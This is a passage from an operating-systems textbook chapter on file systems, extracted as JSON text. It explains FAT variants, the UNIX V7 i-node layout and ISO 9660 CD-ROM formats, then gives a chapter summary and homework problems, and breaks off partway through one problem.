is illustrated in Fig. 4-12.\r\nThe FAT file system comes in three versions: FAT -12, FAT -16, and FAT -32, de\u0002pending on how many bits a disk address contains. Actually, FAT -32 is something\n322 FILE SYSTEMS CHAP. 4\r\nof a misnomer, since only the low-order 28 bits of the disk addresses are used. It\r\nshould have been called FAT -28, but powers of two sound so much neater.\r\nAnother variant of the FAT file system is exFAT , which Microsoft introduced\r\nfor large removable devices. Apple licensed exFAT , so that there is one modern file\r\nsystem that can be used to transfer files both ways between Windows and OS X\r\ncomputers. Since exFAT is proprietary and Microsoft has not released the specif\u0002ication, we will not discuss it further here.\r\nFor all FATs, the disk block can be set to some multiple of 512 bytes (possibly\r\ndifferent for each partition), with the set of allowed block sizes (called cluster\r\nsizes by Microsoft) being different for each variant. The first version of MS-DOS\r\nused FAT -12 with 512-byte blocks, giving a maximum partition size of 212 × 512\r\nbytes (actually only 4086 × 512 bytes because 10 of the disk addresses were used\r\nas special markers, such as end of file, bad block, etc.). With these parameters, the\r\nmaximum disk partition size was about 2 MB and the size of the FAT table in\r\nmemory was 4096 entries of 2 bytes each. Using a 12-bit table entry would have\r\nbeen too slow.\r\nThis system worked well for floppy disks, but when hard disks came out, it\r\nbecame a problem. Microsoft solved the problem by allowing additional block\r\nsizes of 1 KB, 2 KB, and 4 KB. This change preserved the structure and size of\r\nthe FAT -12 table, but allowed disk partitions of up to 16 MB.\r\nSince MS-DOS supported four disk partitions per disk drive, the new FAT -12\r\nfile system worked up to 64-MB disks. Beyond that, something had to give. What\r\nhappened was the introduction of FAT -16, with 16-bit disk pointers. Additionally,\r\nblock sizes of 8 KB, 16 KB, and 32 KB were permitted. (32,768 is the largest\r\npower of two that can be represented in 16 bits.) The FAT -16 table now occupied\r\n128 KB of main memory all the time, but with the larger memories by then avail\u0002able, it was widely used and rapidly replaced the FAT -12 file system. The largest\r\ndisk partition that can be supported by FAT -16 is 2 GB (64K entries of 32 KB\r\neach) and the largest disk, 8 GB, namely four partitions of 2 GB each. For quite a\r\nwhile, that was good enough.\r\nBut not forever. For business letters, this limit is not a problem, but for storing\r\ndigital video using the DV standard, a 2-GB file holds just over 9 minutes of video.\r\nAs a consequence of the fact that a PC disk can support only four partitions, the\r\nlargest video that can be stored on a disk is about 38 minutes, no matter how large\r\nthe disk is. This limit also means that the largest video that can be edited on line is\r\nless than 19 minutes, since both input and output files are needed.\r\nStarting with the second release of Windows 95, the FAT -32 file system, with\r\nits 28-bit disk addresses, was introduced and the version of MS-DOS underlying\r\nWindows 95 was adapted to support FAT -32. In this system, partitions could theo\u0002retically be 228 × 215 bytes, but they are actually limited to 2 TB (2048 GB) be\u0002cause internally the system keeps track of partition sizes in 512-byte sectors using\r\na 32-bit number, and 29 × 232 is 2 TB. The maximum partition size for various\r\nblock sizes and all three FAT types is shown in Fig. 4-31.\nSEC. 4.5 EXAMPLE FILE SYSTEMS 323\r\nBlock siz e FAT-12 FAT-16 FAT-32\r\n0.5 KB 2 MB\r\n1 KB 4 MB\r\n2 KB 8 MB 128 MB\r\n4 KB 16 MB 256 MB 1 TB\r\n8 KB 512 MB 2 TB\r\n16 KB 1024 MB 2 TB\r\n32 KB 2048 MB 2 TB\r\nFigure 4-31. Maximum partition size for different block sizes. The empty boxes\r\nrepresent forbidden combinations.\r\nIn addition to supporting larger disks, the FAT -32 file system has two other ad\u0002vantages over FAT -16. First, an 8-GB disk using FAT -32 can be a single partition.\r\nUsing FAT -16 it has to be four partitions, which appears to the Windows user as the\r\nC:, D:, E:, and F: logical disk drives. It is up to the user to decide which file to\r\nplace on which drive and keep track of what is where.\r\nThe other advantage of FAT -32 over FAT -16 is that for a given size disk parti\u0002tion, a smaller block size can be used. For example, for a 2-GB disk partition,\r\nFAT-16 must use 32-KB blocks; otherwise with only 64K available disk addresses,\r\nit cannot cover the whole partition. In contrast, FAT -32 can use, for example,\r\n4-KB blocks for a 2-GB disk partition. The advantage of the smaller block size is\r\nthat most files are much shorter than 32 KB. If the block size is 32 KB, a file of 10\r\nbytes ties up 32 KB of disk space. If the average file is, say, 8 KB, then with a\r\n32-KB block, three quarters of the disk will be wasted, not a terribly efficient way\r\nto use the disk. With an 8-KB file and a 4-KB block, there is no disk wastage, but\r\nthe price paid is more RAM eaten up by the FAT . With a 4-KB block and a 2-GB\r\ndisk partition, there are 512K blocks, so the FAT must have 512K entries in memo\u0002ry (occupying 2 MB of RAM).\r\nMS-DOS uses the FAT to keep track of free disk blocks. Any block that is not\r\ncurrently allocated is marked with a special code. When MS-DOS needs a new\r\ndisk block, it searches the FAT for an entry containing this code. Thus no bitmap or\r\nfree list is required."
          },
          "4.5.2 The UNIX V7 File System": {
            "page": 354,
            "content": "4.5.2 The UNIX V7 File System\r\nEven early versions of UNIX had a fairly sophisticated multiuser file system\r\nsince it was derived from MULTICS. Below we will discuss the V7 file system,\r\nthe one for the PDP-11 that made UNIX famous. We will examine a modern\r\nUNIX file system in the context of Linux in Chap. 10.\r\nThe file system is in the form of a tree starting at the root directory, with the\r\naddition of links, forming a directed acyclic graph. File names can be up to 14\n324 FILE SYSTEMS CHAP. 4\r\ncharacters and can contain any ASCII characters except / (because that is the sepa\u0002rator between components in a path) and NUL (because that is used to pad out\r\nnames shorter than 14 characters). NUL has the numerical value of 0.\r\nA UNIX directory entry contains one entry for each file in that directory. Each\r\nentry is extremely simple because UNIX uses the i-node scheme illustrated in\r\nFig. 4-13. A directory entry contains only two fields: the file name (14 bytes) and\r\nthe number of the i-node for that file (2 bytes), as shown in Fig. 4-32. These pa\u0002rameters limit the number of files per file system to 64K.\r\nBytes 2 14\r\nFile name\r\nI-node\r\nnumber\r\nFigure 4-32. A UNIX V7 directory entry.\r\nLike the i-node of Fig. 4-13, the UNIX i-node contains some attributes. The at\u0002tributes contain the file size, three times (creation, last access, and last modifica\u0002tion), owner, group, protection information, and a count of the number of directory\r\nentries that point to the i-node. The latter field is needed due to links. Whenever a\r\nnew link is made to an i-node, the count in the i-node is increased. When a link is\r\nremoved, the count is decremented. When it gets to 0, the i-node is reclaimed and\r\nthe disk blocks are put back in the free list.\r\nKeeping track of disk blocks is done using a generalization of Fig. 4-13 in\r\norder to handle very large files. The first 10 disk addresses are stored in the i-node\r\nitself, so for small files, all the necessary information is right in the i-node, which\r\nis fetched from disk to main memory when the file is opened. For somewhat larger\r\nfiles, one of the addresses in the i-node is the address of a disk block called a sin\u0002gle indirect block. This block contains additional disk addresses. If this still is\r\nnot enough, another address in the i-node, called a double indirect block, contains\r\nthe address of a block that contains a list of single indirect blocks. Each of these\r\nsingle indirect blocks points to a few hundred data blocks. If even this is not\r\nenough, a triple indirect block can also be used. The complete picture is given in\r\nFig. 4-33.\r\nWhen a file is opened, the file system must take the file name supplied and\r\nlocate its disk blocks. Let us consider how the path name /usr/ast/mbox is looked\r\nup. We will use UNIX as an example, but the algorithm is basically the same for\r\nall hierarchical directory systems. First the file system locates the root directory.\r\nIn UNIX its i-node is located at a fixed place on the disk. From this i-node, it\r\nlocates the root directory, which can be anywhere on the disk, but say block 1.\r\nAfter that it reads the root directory and looks up the first component of the\r\npath, usr, in the root directory to find the i-node number of the file /usr. Locating\nSEC. 4.5 EXAMPLE FILE SYSTEMS 325\r\nI-node\r\nAttributes\r\nDisk addresses\r\nSingle\r\nindirect\r\nblock\r\nDouble\r\nindirect\r\nblock\r\nTriple\r\nindirect\r\nblock\r\nAddresses of\r\ndata blocks\r\nFigure 4-33. A UNIX i-node.\r\nan i-node from its number is straightforward, since each one has a fixed location on\r\nthe disk. From this i-node, the system locates the directory for /usr and looks up\r\nthe next component, ast, in it. When it has found the entry for ast, it has the i-node\r\nfor the directory /usr/ast. From this i-node it can find the directory itself and look\r\nup mbox. The i-node for this file is then read into memory and kept there until the\r\nfile is closed. The lookup process is illustrated in Fig. 4-34.\r\nRelative path names are looked up the same way as absolute ones, only starting\r\nfrom the working directory instead of from the root directory. Every directory has\r\nentries for . and .. which are put there when the directory is created. The entry .\r\nhas the i-node number for the current directory, and the entry for .. has the i-node\r\nnumber for the parent directory. Thus, a procedure looking up ../dick/prog.c simply\r\nlooks up .. in the working directory, finds the i-node number for the parent direc\u0002tory, and searches that directory for dick. No special mechanism is needed to\r\nhandle these names. As far as the directory system is concerned, they are just or\u0002dinary ASCII strings, just the same as any other names. The only bit of trickery\r\nhere is that .. in the root directory points to itself."
          },
          "4.5.3 CD-ROM File Systems": {
            "page": 356,
            "content": "4.5.3 CD-ROM File Systems\r\nAs our last example of a file system, let us consider the file systems used on\r\nCD-ROMs. These systems are particularly simple because they were designed for\r\nwrite-once media. Among other things, for example, they hav e no provision for\n326 FILE SYSTEMS CHAP. 4\r\nRoot directory\r\nI-node 6\r\nis for /usr\r\nBlock 132\r\nis /usr\r\ndirectory\r\nI-node 26\r\nis for\r\n/usr/ast\r\nBlock 406\r\nis /usr/ast\r\ndirectory\r\nLooking up\r\nusr yields\r\ni-node 6\r\nI-node 6\r\nsays that\r\n/usr is in\r\nblock 132\r\n/usr/ast\r\nis i-node\r\n26\r\n/usr/ast/mbox\r\nis i-node\r\n60\r\nI-node 26\r\nsays that\r\n/usr/ast is in\r\nblock 406\r\n1\r\n1\r\n4\r\n7\r\n14\r\n9\r\n6\r\n8\r\n.\r\n..\r\nbin\r\ndev\r\nlib\r\netc\r\nusr\r\ntmp\r\n6\r\n1\r\n19\r\n30\r\n51\r\n26\r\n45\r\ndick\r\nerik\r\njim\r\nast\r\nbal\r\n26\r\n6\r\n64\r\n92\r\n60\r\n81\r\n17\r\ngrants\r\nbooks\r\nmbox\r\nminix\r\nsrc\r\nMode\r\nsize\r\ntimes\r\n132\r\nMode\r\nsize\r\ntimes\r\n406\r\nFigure 4-34. The steps in looking up /usr/ast/mbox.\r\nkeeping track of free blocks because on a CD-ROM files cannot be freed or added\r\nafter the disk has been manufactured. Below we will take a look at the main CD\u0002ROM file system type and two extensions to it. While CD-ROMs are now old, they\r\nare also simple, and the file systems used on DVDs and Blu-ray are based on the\r\none for CD-ROMS.\r\nSome years after the CD-ROM made its debut, the CD-R (CD Recordable) was\r\nintroduced. Unlike the CD-ROM, it is possible to add files after the initial burning,\r\nbut these are simply appended to the end of the CD-R. Files are never removed\r\n(although the directory can be updated to hide existing files). As a consequence of\r\nthis ‘‘append-only’’ file system, the fundamental properties are not altered. In par\u0002ticular, all the free space is in one contiguous chunk at the end of the CD.\r\nThe ISO 9660 File System\r\nThe most common standard for CD-ROM file systems was adopted as an Inter\u0002national Standard in 1988 under the name ISO 9660. Virtually every CD-ROM\r\ncurrently on the market is compatible with this standard, sometimes with the exten\u0002sions to be discussed below. One goal of this standard was to make every CD\u0002ROM readable on every computer, independent of the byte ordering and the operat\u0002ing system used. As a consequence, some limitations were placed on the file sys\u0002tem to make it possible for the weakest operating systems then in use (such as MS\u0002DOS) to read it.\r\nCD-ROMs do not have concentric cylinders the way magnetic disks do. In\u0002stead there is a single continuous spiral containing the bits in a linear sequence\nSEC. 4.5 EXAMPLE FILE SYSTEMS 327\r\n(although seeks across the spiral are possible). The bits along the spiral are divid\u0002ed into logical blocks (also called logical sectors) of 2352 bytes. Some of these are\r\nfor preambles, error correction, and other overhead. The payload portion of each\r\nlogical block is 2048 bytes. When used for music, CDs have leadins, leadouts, and\r\nintertrack gaps, but these are not used for data CD-ROMs. Often the position of a\r\nblock along the spiral is quoted in minutes and seconds. It can be converted to a\r\nlinear block number using the conversion factor of 1 sec = 75 blocks.\r\nISO 9660 supports CD-ROM sets with as many as 216 − 1 CDs in the set. The\r\nindividual CD-ROMs may also be partitioned into logical volumes (partitions).\r\nHowever, below we will concentrate on ISO 9660 for a single unpartitioned CD\u0002ROM.\r\nEvery CD-ROM begins with 16 blocks whose function is not defined by the\r\nISO 9660 standard. A CD-ROM manufacturer could use this area for providing a\r\nbootstrap program to allow the computer to be booted from the CD-ROM, or for\r\nsome nefarious purpose. Next comes one block containing the primary volume\r\ndescriptor, which contains some general information about the CD-ROM. This\r\ninformation includes the system identifier (32 bytes), volume identifier (32 bytes),\r\npublisher identifier (128 bytes), and data preparer identifier (128 bytes). The man\u0002ufacturer can fill in these fields in any desired way, except that only uppercase let\u0002ters, digits, and a very small number of punctuation marks may be used to ensure\r\ncross-platform compatibility.\r\nThe primary volume descriptor also contains the names of three files, which\r\nmay contain the abstract, copyright notice, and bibliographic information, re\u0002spectively. In addition, certain key numbers are also present, including the logical\r\nblock size (normally 2048, but 4096, 8192, and larger powers of 2 are allowed in\r\ncertain cases), the number of blocks on the CD-ROM, and the creation and expira\u0002tion dates of the CD-ROM. Finally, the primary volume descriptor also contains a\r\ndirectory entry for the root directory, telling where to find it on the CD-ROM (i.e.,\r\nwhich block it starts at). From this directory, the rest of the file system can be lo\u0002cated.\r\nIn addition to the primary volume descriptor, a CD-ROM may contain a sup\u0002plementary volume descriptor. It contains similar information to the primary, but\r\nthat will not concern us here.\r\nThe root directory, and every other directory for that matter, consists of a vari\u0002able number of entries, the last of which contains a bit marking it as the final one.\r\nThe directory entries themselves are also variable length. Each directory entry\r\nconsists of 10 to 12 fields, of which some are in ASCII and others are numerical\r\nfields in binary. The binary fields are encoded twice, once in little-endian format\r\n(used on Pentiums, for example) and once in big-endian format (used on SPARCs,\r\nfor example). Thus, a 16-bit number uses 4 bytes and a 32-bit number uses 8\r\nbytes.\r\nThe use of this redundant coding was necessary to avoid hurting anyone’s feel\u0002ings when the standard was developed. If the standard had dictated little endian,\n328 FILE SYSTEMS CHAP. 4\r\nthen people from companies whose products were big endian would have felt like\r\nsecond-class citizens and would not have accepted the standard. The emotional\r\ncontent of a CD-ROM can thus be quantified and measured exactly in kilo\u0002bytes/hour of wasted space.\r\nThe format of an ISO 9660 directory entry is illustrated in Fig. 4-35. Since di\u0002rectory entries have variable lengths, the first field is a byte telling how long the\r\nentry is. This byte is defined to have the high-order bit on the left to avoid any\r\nambiguity.\r\n11 8 8 7 1 2 4\r\nLocation of file\r\nExtended attribute record length\r\nDirectory entry length\r\nFile size Date and time CD # L File name Sys\r\n1 4-15\r\nPadding\r\nFlags\r\nInterleave Base name Ext Ver • ;\r\nBytes\r\nFigure 4-35. The ISO 9660 directory enty.\r\nDirectory entries may optionally have extended attributes. If this feature is\r\nused, the second byte tells how long the extended attributes are.\r\nNext comes the starting block of the file itself. Files are stored as contiguous\r\nruns of blocks, so a file’s location is completely specified by the starting block and\r\nthe size, which is contained in the next field.\r\nThe date and time that the CD-ROM was recorded is stored in the next field,\r\nwith separate bytes for the year, month, day, hour, minute, second, and time zone.\r\nYears begin to count at 1900, which means that CD-ROMs will suffer from a\r\nY2156 problem because the year following 2155 will be 1900. This problem could\r\nhave been delayed by defining the origin of time to be 1988 (the year the standard\r\nwas adopted). Had that been done, the problem would have been postponed until\r\n2244. Every 88 extra years helps.\r\nThe Flags field contains a few miscellaneous bits, including one to hide the\r\nentry in listings (a feature copied from MS-DOS), one to distinguish an entry that\r\nis a file from an entry that is a directory, one to enable the use of the extended at\u0002tributes, and one to mark the last entry in a directory. A few other bits are also\r\npresent in this field but they will not concern us here. The next field deals with\r\ninterleaving pieces of files in a way that is not used in the simplest version of ISO\r\n9660, so we will not consider it further.\r\nThe next field tells which CD-ROM the file is located on. It is permitted that a\r\ndirectory entry on one CD-ROM refers to a file located on another CD-ROM in the\r\nset. In this way, it is possible to build a master directory on the first CD-ROM that\r\nlists all the files on all the CD-ROMs in the complete set.\r\nThe field marked L in Fig. 4-35 gives the size of the file name in bytes. It is\r\nfollowed by the file name itself. A file name consists of a base name, a dot, an\nSEC. 4.5 EXAMPLE FILE SYSTEMS 329\r\nextension, a semicolon, and a binary version number (1 or 2 bytes). The base\r\nname and extension may use uppercase letters, the digits 0–9, and the underscore\r\ncharacter. All other characters are forbidden to make sure that every computer can\r\nhandle every file name. The base name can be up to eight characters; the extension\r\ncan be up to three characters. These choices were dictated by the need to be MS\u0002DOS compatible. A file name may be present in a directory multiple times, as\r\nlong as each one has a different version number.\r\nThe last two fields are not always present. The Padding field is used to force\r\nev ery directory entry to be an even number of bytes, to align the numeric fields of\r\nsubsequent entries on 2-byte boundaries. If padding is needed, a 0 byte is used.\r\nFinally, we hav e the System use field. Its function and size are undefined, except\r\nthat it must be an even number of bytes. Different systems use it in different ways.\r\nThe Macintosh keeps Finder flags here, for example.\r\nEntries within a directory are listed in alphabetical order except for the first\r\ntwo entries. The first entry is for the directory itself. The second one is for its par\u0002ent. In this respect, these entries are similar to the UNIX . and .. directory entries.\r\nThe files themselves need not be in directory order.\r\nThere is no explicit limit to the number of entries in a directory. Howev er,\r\nthere is a limit to the depth of nesting. The maximum depth of directory nesting is\r\neight. This limit was arbitrarily set to make some implementations simpler.\r\nISO 9660 defines what are called three levels. Level 1 is the most restrictive\r\nand specifies that file names are limited to 8 + 3 characters as we have described,\r\nand also requires all files to be contiguous as we have described. Furthermore, it\r\nspecifies that directory names be limited to eight characters with no extensions.\r\nUse of this level maximizes the chances that a CD-ROM can be read on every\r\ncomputer.\r\nLevel 2 relaxes the length restriction. It allows files and directories to have\r\nnames of up to 31 characters, but still from the same set of characters.\r\nLevel 3 uses the same name limits as level 2, but partially relaxes the assump\u0002tion that files have to be contiguous. With this level, a file may consist of several\r\nsections (extents), each of which is a contiguous run of blocks. The same run may\r\noccur multiple times in a file and may also occur in two or more files. If large\r\nchunks of data are repeated in several files, level 3 provides some space optimiza\u0002tion by not requiring the data to be present multiple times.\r\nRock Ridge Extensions\r\nAs we have seen, ISO 9660 is highly restrictive in sev eral ways. Shortly after it\r\ncame out, people in the UNIX community began working on an extension to make\r\nit possible to represent UNIX file systems on a CD-ROM. These extensions were\r\nnamed Rock Ridge, after a town in the Mel Brooks movie Blazing Saddles, proba\u0002bly because one of the committee members liked the film.\n330 FILE SYSTEMS CHAP. 4\r\nThe extensions use the System use field in order to make Rock Ridge CD\u0002ROMs readable on any computer. All the other fields retain their normal ISO 9660\r\nmeaning. Any system not aware of the Rock Ridge extensions just ignores them\r\nand sees a normal CD-ROM.\r\nThe extensions are divided up into the following fields:\r\n1. PX - POSIX attributes.\r\n2. PN - Major and minor device numbers.\r\n3. SL - Symbolic link.\r\n4. NM - Alternative name.\r\n5. CL - Child location.\r\n6. PL - Parent location.\r\n7. RE - Relocation.\r\n8. TF - Time stamps.\r\nThe PX field contains the standard UNIX rwxrwxrwx permission bits for the\r\nowner, group, and others. It also contains the other bits contained in the mode\r\nword, such as the SETUID and SETGID bits, and so on.\r\nTo allow raw devices to be represented on a CD-ROM, the PN field is present.\r\nIt contains the major and minor device numbers associated with the file. In this\r\nway, the contents of the /dev directory can be written to a CD-ROM and later\r\nreconstructed correctly on the target system.\r\nThe SL field is for symbolic links. It allows a file on one file system to refer to\r\na file on a different file system.\r\nThe most important field is NM. It allows a second name to be associated with\r\nthe file. This name is not subject to the character set or length restrictions of ISO\r\n9660, making it possible to express arbitrary UNIX file names on a CD-ROM.\r\nThe next three fields are used together to get around the ISO 9660 limit of di\u0002rectories that may be nested only eight deep. Using them it is possible to specify\r\nthat a directory is to be relocated, and to tell where it goes in the hierarchy. It is ef\u0002fectively a way to work around the artificial depth limit.\r\nFinally, the TF field contains the three timestamps included in each UNIX i\u0002node, namely the time the file was created, the time it was last modified, and the\r\ntime it was last accessed. Together, these extensions make it possible to copy a\r\nUNIX file system to a CD-ROM and then restore it correctly to a different system.\r\nJoliet Extensions\r\nThe UNIX community was not the only group that did not like ISO 9660 and\r\nwanted a way to extend it. Microsoft also found it too restrictive (although it was\r\nMicrosoft’s own MS-DOS that caused most of the restrictions in the first place).\nSEC. 4.5 EXAMPLE FILE SYSTEMS 331\r\nTherefore Microsoft invented some extensions that were called Joliet. They were\r\ndesigned to allow Windows file systems to be copied to CD-ROM and then restor\u0002ed, in precisely the same way that Rock Ridge was designed for UNIX. Virtually\r\nall programs that run under Windows and use CD-ROMs support Joliet, including\r\nprograms that burn CD-recordables. Usually, these programs offer a choice be\u0002tween the various ISO 9660 levels and Joliet.\r\nThe major extensions provided by Joliet are:\r\n1. Long file names.\r\n2. Unicode character set.\r\n3. Directory nesting deeper than eight levels.\r\n4. Directory names with extensions\r\nThe first extension allows file names up to 64 characters. The second extension\r\nenables the use of the Unicode character set for file names. This extension is im\u0002portant for software intended for use in countries that do not use the Latin alpha\u0002bet, such as Japan, Israel, and Greece. Since Unicode characters are 2 bytes, the\r\nmaximum file name in Joliet occupies 128 bytes.\r\nLike Rock Ridge, the limitation on directory nesting is removed by Joliet. Di\u0002rectories can be nested as deeply as needed. Finally, directory names can have ex\u0002tensions. It is not clear why this extension was included, since Windows direc\u0002tories virtually never use extensions, but maybe some day they will."
          }
        }
      },
      "4.6 RESEARCH ON FILE SYSTEMS": {
        "page": 362,
        "content": "4.6 RESEARCH ON FILE SYSTEMS\r\nFile systems have always attracted more research than other parts of the oper\u0002ating system and that is still the case. Entire conferences such as FAST, MSST,\r\nand NAS, are devoted largely to file and storage systems. While standard file sys\u0002tems are fairly well understood, there is still quite a bit of research going on about\r\nbackups (Smaldone et al., 2013; and Wallace et al., 2012) caching (Koller et al.;\r\nOh, 2012; and Zhang et al., 2013a), erasing data securely (Wei et al., 2011), file\r\ncompression (Harnik et al., 2013), flash file systems (No, 2012; Park and Shen,\r\n2012; and Narayanan, 2009), performance (Leventhal, 2013; and Schindler et al.,\r\n2011), RAID (Moon and Reddy, 2013), reliability and recovery from errors (Chi\u0002dambaram et al., 2013; Ma et. al, 2013; McKusick, 2012; and Van Moolenbroek et\r\nal., 2012), user-level file systems (Rajgarhia and Gehani, 2010), verifying consis\u0002tency (Fryer et al., 2012), and versioning file systems (Mashtizadeh et al., 2013).\r\nJust measuring what is actually going in a file system is also a research topic (Har\u0002ter et al., 2012).\r\nSecurity is a perennial topic (Botelho et al., 2013; Li et al., 2013c; and Lorch\r\net al., 2013). In contrast, a hot new topic is cloud file systems (Mazurek et al.,\n332 FILE SYSTEMS CHAP. 4\r\n2012; and Vrable et al., 2012). Another area that has been getting attention\r\nrecently is provenance—keeping track of the history of the data, including where\r\nthey came from, who owns them, and how they hav e been transformed (Ghoshal\r\nand Plale, 2013; and Sultana and Bertino, 2013). Keeping data safe and useful for\r\ndecades is also of interest to companies that have a leg al requirement to do so\r\n(Baker et al., 2006). Finally, other researchers are rethinking the file system stack\r\n(Appuswamy et al., 2011)."
      },
      "4.7 SUMMARY": {
        "page": 363,
        "content": "4.7 SUMMARY\r\nWhen seen from the outside, a file system is a collection of files and direc\u0002tories, plus operations on them. Files can be read and written, directories can be\r\ncreated and destroyed, and files can be moved from directory to directory. Most\r\nmodern file systems support a hierarchical directory system in which directories\r\nmay have subdirectories and these may have subsubdirectories ad infinitum.\r\nWhen seen from the inside, a file system looks quite different. The file system\r\ndesigners have to be concerned with how storage is allocated, and how the system\r\nkeeps track of which block goes with which file. Possibilities include contiguous\r\nfiles, linked lists, file-allocation tables, and i-nodes. Different systems have dif\u0002ferent directory structures. Attributes can go in the directories or somewhere else\r\n(e.g., an i-node). Disk space can be managed using free lists or bitmaps. File-sys\u0002tem reliability is enhanced by making incremental dumps and by having a program\r\nthat can repair sick file systems. File-system performance is important and can be\r\nenhanced in several ways, including caching, read ahead, and carefully placing the\r\nblocks of a file close to each other. Log-structured file systems also improve per\u0002formance by doing writes in large units.\r\nExamples of file systems include ISO 9660, -DOS, and UNIX. These differ in\r\nmany ways, including how they keep track of which blocks go with which file, di\u0002rectory structure, and management of free disk space.\r\nPROBLEMS\r\n1. Give fiv e different path names for the file /etc/passwd. (Hint: Think about the direc\u0002tory entries ‘‘.’’ and ‘‘..’’.)\r\n2. In Windows, when a user double clicks on a file listed by Windows Explorer, a pro\u0002gram is run and given that file as a parameter. List two different ways the operating\r\nsystem could know which program to run.\nCHAP. 4 PROBLEMS 333\r\n3. In early UNIX systems, executable files (a.out files) began with a very specific magic\r\nnumber, not one chosen at random. These files began with a header, followed by the\r\ntext and data segments. Why do you think a very specific number was chosen for ex\u0002ecutable files, whereas other file types had a more-or-less random magic number as the\r\nfirst word?\r\n4. Is the open system call in UNIX absolutely essential? What would the consequences\r\nbe of not having it?\r\n5. Systems that support sequential files always have an operation to rewind files. Do sys\u0002tems that support random-access files need this, too?\r\n6. Some operating systems provide a system call rename to give a file a new name. Is\r\nthere any difference at all between using this call to rename a file and just copying the\r\nfile to a new file with the new name, followed by deleting the old one?\r\n7. In some systems it is possible to map part of a file into memory. What restrictions must\r\nsuch systems impose? How is this partial mapping implemented?\r\n8. A simple operating system supports only a single directory but allows it to have arbi\u0002trarily many files with arbitrarily long file names. Can something approximating a hier\u0002archical file system be simulated? How?\r\n9. In UNIX and Windows, random access is done by having a special system call that\r\nmoves the ‘‘current position’’ pointer associated with a file to a given byte in the file.\r\nPropose an alternative way to do random access without having this system call.\r\n10. Consider the directory tree of Fig. 4-8. If /usr/jim is the working directory, what is the\r\nabsolute path name for the file whose relative path name is ../ast/x?\r\n11. Contiguous allocation of files leads to disk fragmentation, as mentioned in the text, be\u0002cause some space in the last disk block will be wasted in files whose length is not an\r\nintegral number of blocks. Is this internal fragmentation or external fragmentation?\r\nMake an analogy with something discussed in the previous chapter.\r\n12. Describe the effects of a corrupted data block for a given file for: (a) contiguous, (b)\r\nlinked, and (c) indexed (or table based).\r\n13. One way to use contiguous allocation of the disk and not suffer from holes is to com\u0002pact the disk every time a file is removed. Since all files are contiguous, copying a file\r\nrequires a seek and rotational delay to read the file, followed by the transfer at full\r\nspeed. Writing the file back requires the same work. Assuming a seek time of 5 msec,\r\na rotational delay of 4 msec, a transfer rate of 80 MB/sec, and an average file size of 8\r\nKB, how long does it take to read a file into main memory and then write it back to the\r\ndisk at a new location? Using these numbers, how long would it take to compact half\r\nof a 16-GB disk?\r\n14. In light of the answer to the previous question, does compacting the disk ever make\r\nany sense?\r\n15. Some digital consumer devices need to store data, for example as files. Name a modern\r\ndevice that requires file storage and for which contiguous allocation would be a fine\r\nidea.\n334 FILE SYSTEMS CHAP. 4\r\n16. Consider the i-node shown in Fig. 4-13. If it contains 10 direct addresses and these\r\nwere 8 bytes each and all disk blocks were 1024 KB, what would the largest possible\r\nfile be?\r\n17. For a giv en class, the student records are stored in a file. The records are randomly ac\u0002cessed and updated. Assume that each student’s record is of fixed size. Which of the\r\nthree allocation schemes (contiguous, linked and table/indexed) will be most ap\u0002propriate?\r\n18. Consider a file whose size varies between 4 KB and 4 MB during its lifetime. Which\r\nof the three allocation schemes (contiguous, linked and table/indexed) will be most ap\u0002propriate?\r\n19. It has been suggested that efficiency could be improved and disk space saved by stor\u0002ing the data of a short file within the i-node. For the i-node of Fig. 4-13, how many\r\nbytes of data could be stored inside the i-node?\r\n20. Tw o computer science students, Carolyn and Elinor, are having a discussion about i\u0002nodes. Carolyn maintains that memories have gotten so large and so cheap that when a\r\nfile is opened, it is simpler and faster just to fetch a new copy of the i-node into the i\u0002node table, rather than search the entire table to see if it is already there. Elinor dis\u0002agrees. Who is right?\r\n21. Name one advantage of hard links over symbolic links and one advantage of symbolic\r\nlinks over hard links.\r\n22. Explain how hard links and soft links differ with respective to i-node allocations.\r\n23. Consider a 4-TB disk that uses 4-KB blocks and the free-list method. How many block\r\naddresses can be stored in one block?\r\n24. Free disk space can be kept track of using a free list or a bitmap. Disk addresses re\u0002quire D bits. For a disk with B blocks, F of which are free, state the condition under\r\nwhich the free list uses less space than the bitmap. For D having the value 16 bits,\r\nexpress your answer as a percentage of the disk space that must be free.\r\n25. The beginning of a free-space bitmap looks like this after the disk partition is first for\u0002matted: 1000 0000 0000 0000 (the first block is used by the root directory). The sys\u0002tem always searches for free blocks starting at the lowest-numbered block, so after\r\nwriting file A, which uses six blocks, the bitmap looks like this: 1111 1110 0000 0000.\r\nShow the bitmap after each of the following additional actions:\r\n(a) File B is written, using fiv e blocks.\r\n(b) File A is deleted.\r\n(c) File C is written, using eight blocks.\r\n(d) File B is deleted.\r\n26. What would happen if the bitmap or free list containing the information about free disk\r\nblocks was completely lost due to a crash? Is there any way to recover from this disas\u0002ter, or is it bye-bye disk? Discuss your answers for UNIX and the FAT -16 file system\r\nseparately.\nCHAP. 4 PROBLEMS 335\r\n27. Oliver Owl’s night job at the university computing center is to change the tapes used\r\nfor overnight data backups. While waiting for each tape to complete, he works on writ\u0002ing his thesis that proves Shakespeare’s plays were written by extraterrestrial visitors.\r\nHis text processor runs on the system being backed up since that is the only one they\r\nhave. Is there a problem with this arrangement?\r\n28. We discussed making incremental dumps in some detail in the text. In Windows it is\r\neasy to tell when to dump a file because every file has an archive bit. This bit is miss\u0002ing in UNIX. How do UNIX backup programs know which files to dump?\r\n29. Suppose that file 21 in Fig. 4-25 was not modified since the last dump. In what way\r\nwould the four bitmaps of Fig. 4-26 be different?\r\n30. It has been suggested that the first part of each UNIX file be kept in the same disk\r\nblock as its i-node. What good would this do?\r\n31. Consider Fig. 4-27. Is it possible that for some particular block number the counters in\r\nboth lists have the value 2? How should this problem be corrected?\r\n32. The performance of a file system depends upon the cache hit rate (fraction of blocks\r\nfound in the cache). If it takes 1 msec to satisfy a request from the cache, but 40 msec\r\nto satisfy a request if a disk read is needed, give a formula for the mean time required\r\nto satisfy a request if the hit rate is h. Plot this function for values of h varying from 0\r\nto 1.0.\r\n33. For an external USB hard drive attached to a computer, which is more suitable: a write\u0002through cache or a block cache?\r\n34. Consider an application where students’ records are stored in a file. The application\r\ntakes a student ID as input and subsequently reads, updates, and writes the correspond\u0002ing student record; this is repeated till the application quits. Would the \"block read\u0002ahead\" technique be useful here?\r\n35. Consider a disk that has 10 data blocks starting from block 14 through 23. Let there be\r\n2 files on the disk: f1 and f2. The directory structure lists that the first data blocks of f1\r\nand f2 are respectively 22 and 16. Given the FAT table entries as below, what are the\r\ndata blocks allotted to f1 and f2?\r\n(14,18); (15,17); 